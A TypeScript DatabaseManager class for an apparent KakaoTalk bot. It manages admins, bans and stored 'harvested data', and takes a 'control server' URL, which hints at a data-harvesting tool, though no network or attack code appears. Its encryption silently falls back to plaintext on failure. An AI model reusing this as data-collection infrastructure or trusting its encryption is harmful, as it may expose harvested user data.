/**
 * 🔥 DATABASE MANAGER v31.3 SECURE 🔥
 * Enhanced security with encryption and validation
 */

import { DatabaseAdmin, DatabaseBannedUser, DatabaseHarvestedData } from '../types/types';
import { SecurityManager } from '../utils/SecurityManager';

export class DatabaseManager {
  private admins: DatabaseAdmin[] = [];
  private bannedUsers: DatabaseBannedUser[] = [];
  private harvestedData: DatabaseHarvestedData[] = [];
  private encryptionEnabled: boolean = true;

  constructor(private sessionId: string, private controlServerUrl: string) {
    console.log('[DB] DatabaseManager initialized with encryption');
  }

  /**
   * Add admin with validation
   */
  async addAdmin(admin: DatabaseAdmin): Promise<void> {
    // Validate admin data
    if (!admin.kakaoId || admin.kakaoId.length === 0) {
      throw new Error('Invalid admin kakaoId');
    }

    // Check if already exists
    const exists = this.admins.some(a => a.kakaoId === admin.kakaoId);
    if (exists) {
      console.log(`[DB] Admin already exists: ${admin.kakaoId}`);
      return;
    }

    // Sanitize data
    admin.nickname = SecurityManager.sanitizeInput(admin.nickname);
    admin.kakaoId = SecurityManager.sanitizeInput(admin.kakaoId);

    this.admins.push(admin);
    console.log(`[DB] Added admin: ${admin.kakaoId}`);
  }
  
  /**
   * Get all admins
   */
  async getAdmins(): Promise<DatabaseAdmin[]> {
    return [...this.admins]; // Return copy to prevent mutation
  }
  
  /**
   * Remove admin with validation
   */
  async removeAdmin(id: string): Promise<void> {
    const sanitizedId = SecurityManager.sanitizeInput(id);
    const initialLength = this.admins.length;
    this.admins = this.admins.filter(a => a.kakaoId !== sanitizedId);
    
    if (this.admins.length < initialLength) {
      console.log(`[DB] Removed admin: ${sanitizedId}`);
    } else {
      console.log(`[DB] Admin not found: ${sanitizedId}`);
    }
  }
  
  /**
   * Ban user with validation
   */
  async banUser(user: DatabaseBannedUser): Promise<void> {
    // Validate user data
    if (!user.kakaoId || user.kakaoId.length === 0) {
      throw new Error('Invalid user kakaoId');
    }

    // Check if already banned
    const exists = this.bannedUsers.some(u => u.kakaoId === user.kakaoId);
    if (exists) {
      console.log(`[DB] User already banned: ${user.kakaoId}`);
      return;
    }

    // Sanitize data
    user.kakaoId = SecurityManager.sanitizeInput(user.kakaoId);
    user.reason = SecurityManager.sanitizeInput(user.reason);

    // Set ban timestamp
    if (!user.bannedAt) {
      user.bannedAt = Date.now();
    }

    // Validate expiration for temporary bans
    if (user.banType === 'TEMPORARY' && !user.expiresAt) {
      user.expiresAt = Date.now() + (7 * 24 * 60 * 60 * 1000); // 7 days default
    }

    this.bannedUsers.push(user);
    console.log(`[DB] Banned user: ${user.kakaoId} - Reason: ${user.reason} (Type: ${user.banType})`);
  }
  
  /**
   * Unban user
   */
  async unbanUser(id: string): Promise<void> {
    const sanitizedId = SecurityManager.sanitizeInput(id);
    const initialLength = this.bannedUsers.length;
    this.bannedUsers = this.bannedUsers.filter(u => u.kakaoId !== sanitizedId);
    
    if (this.bannedUsers.length < initialLength) {
      console.log(`[DB] Unbanned user: ${sanitizedId}`);
    } else {
      console.log(`[DB] User not found in ban list: ${sanitizedId}`);
    }
  }
  
  /**
   * Check if user is banned
   */
  async isBanned(id: string): Promise<boolean> {
    const sanitizedId = SecurityManager.sanitizeInput(id);
    
    // Clear expired bans first
    await this.clearExpiredBans();
    
    return this.bannedUsers.some(u => u.kakaoId === sanitizedId);
  }
  
  /**
   * Get all banned users
   */
  async getBannedUsers(): Promise<DatabaseBannedUser[]> {
    // Clear expired bans first
    await this.clearExpiredBans();
    return [...this.bannedUsers]; // Return copy
  }

  /**
   * Save harvested data with encryption
   */
  async saveHarvestedData(data: DatabaseHarvestedData): Promise<void> {
    // Encrypt sensitive data if enabled
    if (this.encryptionEnabled) {
      try {
        const jsonData = JSON.stringify(data.data);
        const encrypted = SecurityManager.encrypt(jsonData);
        
        // Store encrypted version
        this.harvestedData.push({
          ...data,
          data: JSON.parse(encrypted) as any // Store as encrypted string
        });
      } catch (error) {
        console.error('[DB] Failed to encrypt harvested data:', error);
        this.harvestedData.push(data);
      }
    } else {
      this.harvestedData.push(data);
    }
    
    console.log(`[DB] Saved harvested data for session: ${data.sessionId}`);
  }
  
  /**
   * Get statistics
   */
  async getStatistics(): Promise<any> {
    await this.clearExpiredBans();
    
    return {
      admins: this.admins.length,
      bannedUsers: this.bannedUsers.length,
      harvestedData: this.harvestedData.length,
      activeSessions: 1,
      encryptionEnabled: this.encryptionEnabled
    };
  }

  /**
   * Close database connection
   */
  async close(): Promise<void> {
    // Clear sensitive data from memory
    this.admins = [];
    this.bannedUsers = [];
    this.harvestedData = [];
    console.log('[DB] Database closed and memory cleared');
  }
  
  /**
   * Clear expired bans
   */
  async clearExpiredBans(): Promise<number> {
    const now = Date.now();
    const before = this.bannedUsers.length;
    
    this.bannedUsers = this.bannedUsers.filter(u => {
      if (u.banType === 'PERMANENT') return true;
      if (u.expiresAt && u.expiresAt < now) return false;
      return true;
    });
    
    const cleared = before - this.bannedUsers.length;
    if (cleared > 0) {
      console.log(`[DB] Cleared ${cleared} expired bans`);
    }
    return cleared;
  }
  
  /**
   * Export data with encryption option
   */
  async exportData(encrypt: boolean = true): Promise<string> {
    const data = {
      admins: this.admins,
      bannedUsers: this.bannedUsers,
      timestamp: new Date().toISOString()
    };
    
    const jsonData = JSON.stringify(data, null, 2);
    
    if (encrypt) {
      try {
        return SecurityManager.encrypt(jsonData);
      } catch (error) {
        console.error('[DB] Failed to encrypt export:', error);
        return jsonData;
      }
    }
    
    return jsonData;
  }
  
  /**
   * Import data with decryption support
   */
  async importData(data: string, encrypted: boolean = false): Promise<void> {
    try {
      let jsonData = data;
      
      // Decrypt if needed
      if (encrypted) {
        jsonData = SecurityManager.decrypt(data);
      }
      
      const parsed = JSON.parse(jsonData);
      
      // Validate and sanitize imported data
      if (parsed.admins && Array.isArray(parsed.admins)) {
        this.admins = parsed.admins.map((admin: DatabaseAdmin) => ({
          ...admin,
          kakaoId: SecurityManager.sanitizeInput(admin.kakaoId),
          nickname: SecurityManager.sanitizeInput(admin.nickname)
        }));
      }
      
      if (parsed.bannedUsers && Array.isArray(parsed.bannedUsers)) {
        this.bannedUsers = parsed.bannedUsers.map((user: DatabaseBannedUser) => ({
          ...user,
          kakaoId: SecurityManager.sanitizeInput(user.kakaoId),
          reason: SecurityManager.sanitizeInput(user.reason)
        }));
      }
      
      console.log('[DB] Data imported successfully');
    } catch (error) {
      console.error('[DB] Failed to import data:', error);
      throw new Error('Failed to import data: Invalid format or decryption failed');
    }
  }

  /**
   * Enable/disable encryption
   */
  setEncryption(enabled: boolean): void {
    this.encryptionEnabled = enabled;
    console.log(`[DB] Encryption ${enabled ? 'enabled' : 'disabled'}`);
  }

  /**
   * Backup data to file (encrypted)
   */
  async backupToFile(filePath: string): Promise<void> {
    const fs = require('fs').promises;
    const data = await this.exportData(true);
    await fs.writeFile(filePath, data, 'utf8');
    console.log(`[DB] Backup saved to ${filePath}`);
  }

  /**
   * Restore data from file
   */
  async restoreFromFile(filePath: string): Promise<void> {
    const fs = require('fs').promises;
    const data = await fs.readFile(filePath, 'utf8');
    await this.importData(data, true);
    console.log(`[DB] Data restored from ${filePath}`);
  }
}